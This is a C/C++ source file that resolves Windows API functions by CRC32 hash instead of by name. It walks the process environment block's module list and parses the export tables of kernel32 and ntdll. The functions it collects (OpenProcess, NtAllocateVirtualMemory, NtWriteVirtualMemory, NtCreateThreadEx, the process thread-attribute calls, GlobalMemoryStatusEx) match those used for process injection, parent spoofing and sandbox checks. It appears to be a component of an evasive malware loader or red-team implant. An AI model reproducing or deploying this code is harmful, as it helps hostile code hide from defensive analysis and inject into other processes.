#include "resolver.h"
#include "apis.h"
#include <iostream>

// CRC32 hashing function
uint32_t crc32(const char* str) {
    uint32_t crc = 0xFFFFFFFF;
    while (*str) {
        crc ^= *str++;
        for (int i = 0; i < 8; i++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            }
            else {
                crc = crc >> 1;
            }
        }
    }
    return ~crc;
}

// Function to resolve APIs by hash
void ResolveAPIs(LOADLIBRARYA pLoadLibraryA, GETPROCADDRESS pGetProcAddress, PAPI_FUNCTIONS pApiFunctions) {
    // Get the PEB
    PEB* peb = (PEB*)__readgsqword(0x60);

    // Get the Ldr
    PEB_LDR_DATA* ldr = peb->Ldr;

    // Get the first entry in the InMemoryOrderModuleList
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* current = head->Flink;

    // Iterate through the loaded modules
    while (current != head) {
        LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        // Get the module name
        char moduleName[256];
        size_t convertedChars = 0;
        wcstombs_s(&convertedChars, moduleName, sizeof(moduleName), entry->FullDllName.Buffer, sizeof(moduleName) - 1);

        // Hash the module name
        uint32_t moduleHash = crc32(moduleName);

        // Check if this is a module we're interested in
        if (moduleHash == CRC32_KERNEL32_DLL || moduleHash == CRC32_NTDLL_DLL) {
            // Get the module base
            PVOID moduleBase = entry->DllBase;

            // Get the export directory
            PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
            PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dosHeader->e_lfanew);
            PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)moduleBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            // Get the arrays of function names, ordinals, and addresses
            PDWORD addressOfFunctions = (PDWORD)((BYTE*)moduleBase + exportDirectory->AddressOfFunctions);
            PDWORD addressOfNames = (PDWORD)((BYTE*)moduleBase + exportDirectory->AddressOfNames);
            PWORD addressOfNameOrdinals = (PWORD)((BYTE*)moduleBase + exportDirectory->AddressOfNameOrdinals);

            // Iterate through the exported functions
            for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
                // Get the function name
                const char* functionName = (const char*)((BYTE*)moduleBase + addressOfNames[i]);

                // Hash the function name
                uint32_t functionHash = crc32(functionName);

                // Check if this is a function we're interested in
                switch (functionHash) {
                case CRC32_CREATEPROCESSW:
                    pApiFunctions->pCreateProcessW = (FARPROC)((BYTE*)moduleBase + addressOfFunctions[addressOfNameOrdinals[i]]);
                    break;
                case CRC32_OPENPROCESS:
                    pApiFunctions->pOpenProcess = (FARPROC)((BYTE*)moduleBase + addressOfFunctions[addressOfNameOrdinals[i]]);
                    break;
                case CRC32_NTALLOCATEVIRTUALMEMORY:
                    pApiFunctions->pNtAllocateVirtualMemory = (FARPROC)((BYTE*)moduleBase + addressOfFunctions[addressOfNameOrdinals[i]]);
                    break;
                case CRC32_NTWRITEVIRTUALMEMORY:
                    pApiFunctions->pNtWriteVirtualMemory = (FARPROC)((BYTE*)moduleBase + addressOfFunctions[addressOfNameOrdinals[i]]);
                    break;
                case CRC32_NTCREATETHREADEX:
                    pApiFunctions->pNtCreateThreadEx = (FARPROC)((BYTE*)moduleBase + addressOfFunctions[addressOfNameOrdinals[i]]);
                    break;
                case CRC32_NTCLOSE:
                    pApiFunctions->pNtClose = (FARPROC)((BYTE*)moduleBase + addressOfFunctions[addressOfNameOrdinals[i]]);
                    break;
                case CRC32_GLOBALMEMORYSTATUSEX:
                    pApiFunctions->pGlobalMemoryStatusEx = (FARPROC)((BYTE*)moduleBase + addressOfFunctions[addressOfNameOrdinals[i]]);
                    break;
                case CRC32_CREATEFILEW:
                    pApiFunctions->pCreateFileW = (FARPROC)((BYTE*)moduleBase + addressOfFunctions[addressOfNameOrdinals[i]]);
                    break;
                case CRC32_DEVICEIOCONTROL:
                    pApiFunctions->pDeviceIoControl = (FARPROC)((BYTE*)moduleBase + addressOfFunctions[addressOfNameOrdinals[i]]);
                    break;
                case CRC32_UPDATEPROCTHREADATTRIBUTE:
                    pApiFunctions->pUpdateProcThreadAttribute = (FARPROC)((BYTE*)moduleBase + addressOfFunctions[addressOfNameOrdinals[i]]);
                    break;
                case CRC32_INITIALIZEPROCTHREADATTRIBUTELIST:
                    pApiFunctions->pInitializeProcThreadAttributeList = (FARPROC)((BYTE*)moduleBase + addressOfFunctions[addressOfNameOrdinals[i]]);
                    break;
                case CRC32_DELETEPROCTHREADATTRIBUTELIST:
                    pApiFunctions->pDeleteProcThreadAttributeList = (FARPROC)((BYTE*)moduleBase + addressOfFunctions[addressOfNameOrdinals[i]]);
                    break;
                }
            }
        }

        current = current->Flink;
    }
}
